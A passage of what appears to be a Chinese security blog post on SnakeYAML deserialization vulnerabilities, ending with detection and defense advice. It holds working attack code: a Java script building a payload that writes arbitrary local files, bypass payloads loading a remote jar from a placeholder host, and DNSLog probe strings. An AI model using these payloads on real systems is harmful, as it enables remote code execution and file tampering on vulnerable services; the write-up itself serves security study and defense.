class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里贴一个脚本来写入本地文件：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zlg.serialize.snakeyaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.Deflater;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SnakeYamlOffInternet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String [] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> createPoC(<span class="string">&quot;./1.txt&quot;</span>,<span class="string">&quot;./file/yaml-payload.txt&quot;</span>);</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(poc);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">createPoC</span><span class="params">(String SrcPath,String Destpath)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(SrcPath);</span><br><span class="line">        <span class="type">Long</span> <span class="variable">FileLength</span> <span class="operator">=</span> file.length();</span><br><span class="line">        <span class="type">byte</span>[] FileContent = <span class="keyword">new</span> <span class="title class_">byte</span>[FileLength.intValue()];</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">            in.read(FileContent);</span><br><span class="line">            in.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (FileNotFoundException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] compressbytes = compress(FileContent);</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64str</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(compressbytes);</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File [\&quot;&quot;</span>+Destpath+<span class="string">&quot;\&quot;],false],!!java.util.zip.Inflater  &#123; input: !!binary &quot;</span>+base64str+<span class="string">&quot; &#125;,1048576]]&quot;</span>;</span><br><span class="line">        System.out.println(poc);</span><br><span class="line">        <span class="keyword">return</span> poc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] compress(<span class="type">byte</span>[] data) &#123;</span><br><span class="line">        <span class="type">byte</span>[] output = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="type">Deflater</span> <span class="variable">compresser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Deflater</span>();</span><br><span class="line"></span><br><span class="line">        compresser.reset();</span><br><span class="line">        compresser.setInput(data);</span><br><span class="line">        compresser.finish();</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>(data.length);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] buf = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">while</span> (!compresser.finished()) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> compresser.deflate(buf);</span><br><span class="line">                bos.write(buf, <span class="number">0</span>, i);</span><br><span class="line">            &#125;</span><br><span class="line">            output = bos.toByteArray();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            output = data;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                bos.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        compresser.end();</span><br><span class="line">        <span class="keyword">return</span> output;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p>在上文提到了，每个!!修饰过的类会被替换成对应的tag形式，并且使用了一个固定前缀tag:yaml.org,2002:，因此可以利用这个特性来bypass，参考<a target="_blank" rel="noopener" href="https://b1ue.cn/archives/407.html">SnakeYaml 反序列化的一个小 trick</a>。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">!&lt;tag:yaml.org,<span class="number">2002</span>:javax.script.ScriptEngineManager&gt; </span><br><span class="line">[!&lt;tag:yaml.org,<span class="number">2002</span>:java.net.URLClassLoader&gt; [[!&lt;tag:yaml.org,<span class="number">2002</span>:java.net.URL&gt; </span><br><span class="line">[<span class="string">&quot;http://ip/yaml-payload.jar&quot;</span>]]]]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%TAG ! tag:yaml.org,<span class="number">2002</span>:</span><br><span class="line">---</span><br><span class="line">!javax.script.ScriptEngineManager [!java.net.URLClassLoader [[!java.net.URL [<span class="string">&quot;http://ip/yaml-payload.jar&quot;</span>]]]]</span><br></pre></td></tr></table></figure>
+
+<h2 id="探测方式"><a href="#探测方式" class="headerlink" title="探测方式"></a>探测方式</h2><h3 id="SPI"><a href="#SPI" class="headerlink" title="SPI"></a>SPI</h3><p>SnakeYAML在解析带键值对的集合的时候会对键调用hashCode方法，因此会触发DNSLog解析，这里通过构造URL对象并将其构造为一个mapping。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!!java.net.URL [<span class="literal">null</span>, <span class="string">&quot;http://1pvn68.dnslog.cn&quot;</span>]: <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 利用%TAG来申明一个TAG, 后续再调用!str的话就会自动把TAG前缀拼接补全</span></span><br><span class="line">%TAG ! tag:yaml.org,<span class="number">2002</span>:</span><br><span class="line">---</span><br><span class="line">!javax.script.ScriptEngineManager [!java.net.URLClassLoader [[!java.net.URL [<span class="string">&quot;http://ip/yaml-payload.jar&quot;</span>]]]]</span><br></pre></td></tr></table></figure>
+
+<h3 id="HashCode"><a href="#HashCode" class="headerlink" title="HashCode"></a>HashCode</h3><p>具体利用原理详见Y4tacker师傅的分析：<a target="_blank" rel="noopener" href="https://y4tacker.github.io/2022/02/08/year/2022/2/SnakeYAML%E5%AE%9E%E7%8E%B0Gadget%E6%8E%A2%E6%B5%8B/">SnakeYAML实现Gadget探测</a>。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;!!java.net.URL [\&quot;http://ra5zf8uv32z5jnfyy18c1yiwfnle93.oastify.com/\&quot;]: 1&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;key: [!!java.lang.String &#123;&#125;: 0, !!java.net.URL [null, \&quot;[http://5ydl3f.dnslog.cn](http://5ydl3f.dnslog.cn/)\&quot;]: 1]&quot;</span>;</span><br><span class="line"></span><br><span class="line">key: [!!java.lang.String &#123;&#125;: <span class="number">0</span>, !!java.net.URL [<span class="literal">null</span>, <span class="string">&quot;http://jeeoy1.dnslog.cn&quot;</span>]: <span class="number">1</span>]</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/25/SnakeYaml/1709813161116-4c9f4daf-f7ec-456e-89c4-3276e1d694fc.png"></p>
+<h2 id="检测与防御"><a href="#检测与防御" class="headerlink" title="检测与防御"></a>检测与防御</h2><h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><p>排查服务端环境是否使用了SnakeYaml，若使用，则全局搜索关键字yaml.load(，若存在关键字则需要进一步排查参数是否外部可控。</p>
+<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ul>
+<li><p>禁止Yaml.load函数参数外部可控</p>
+</li>
+<li><p>当反序列化在业务中不可获取时，则需严格过滤该参数内容，使用SafeConstructor类对反序列化的内容进行限制或使用白名单控制反序列化的类的白名单</p>
+</li>
+</ul>
+<p><img src="/2023/09/25/SnakeYaml/1709813161236-89e351e6-557d-486b-b475-40bdb25bcde1.png"></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2019/11/29/Java-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">Java SnakeYaml反序列化漏洞</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10655">SnakeYaml 之不出网RCE</a></p>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#YAML%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">YAML简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SnakeYaml%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.</span> <span class="toc-text">SnakeYaml序列化与反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">SnakeYaml反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">3.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-number">3.2.</span> <span class="toc-text">补充</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SPI%E6%9C%BA%E5%88%B6"><span class="toc-number">3.3.</span> <span class="toc-text">SPI机制</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gadgets"><span class="toc-number">4.</span> <span class="toc-text">Gadgets</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JdbcRowSetImpl"><span class="toc-number">4.1.</span> <span class="toc-text">JdbcRowSetImpl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Spring-PropertyPathFactoryBean"><span class="toc-number">4.2.</span> <span class="toc-text">Spring PropertyPathFactoryBean</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache-Commons-Configuration"><span class="toc-number">4.3.</span> <span class="toc-text">Apache Commons Configuration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache-XBean"><span class="toc-number">4.4.</span> <span class="toc-text">Apache XBean</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#C3P0-JndiRefForwardingDataSource"><span class="toc-number">4.5.</span> <span class="toc-text">C3P0 JndiRefForwardingDataSource</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Resource"><span class="toc-number">4.6.</span> <span class="toc-text">Resource</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8"><span class="toc-number">5.</span> <span class="toc-text">不出网利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#C3P0"><span class="toc-number">5.1.</span> <span class="toc-text">C3P0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fastjson"><span class="toc-number">5.2.</span> <span class="toc-text">Fastjson</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass"><span class="toc-number">6.</span> <span class="toc-text">Bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E6%96%B9%E5%BC%8F"><span class="toc-number">7.</span> <span class="toc-text">探测方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SPI"><span class="toc-number">7.1.</span> <span class="toc-text">SPI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HashCode"><span class="toc-number">7.2.</span> <span class="toc-text">HashCode</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%98%B2%E5%BE%A1"><span class="toc-number">8.</span> <span class="toc-text">检测与防御</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B"><span class="toc-number">8.1.</span> <span class="toc-text">检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">8.2.</span> <span class="toc-text">防御</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">8.3.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/&text=SnakeYaml"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/&title=SnakeYaml"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/&is_video=false&description=SnakeYaml"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SnakeYaml&body=Check out this article: https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/&title=SnakeYaml"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/&title=SnakeYaml"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/&title=SnakeYaml"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/&title=SnakeYaml"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/&name=SnakeYaml&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/&t=SnakeYaml"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+      <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2023-2025
+        H3rmesk1t
+      </div>
+      <div class="footer-right">
+        <nav>
+          <ul>
+            <!--
+          --><li><a href="/">Home</a></li><!--
+        --><!--
+          --><li><a href="/archives/">Writing</a></li><!--
+        --><!--
+          --><li><a href="/tags/">Tag</a></li><!--
+        --><!--
+          --><li><a href="/search/">Search</a></li><!--
+        --><!--
+          --><li><a href="/about/">About</a></li><!--
+        -->
+          </ul>
+          <ul>
+            
+              <!-- 不蒜子统计 -->
+              <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_uv" style='display:none'>
+                      本站访客数<span id="busuanzi_value_site_uv"></span>人
+              </span>
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            
+          </ul>
+        </nav>
+      </div>
+      
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'H3rmesk1t/h3rmesk1t.github.io';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = '💬';
+      var utterances_theme = 'github-light';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
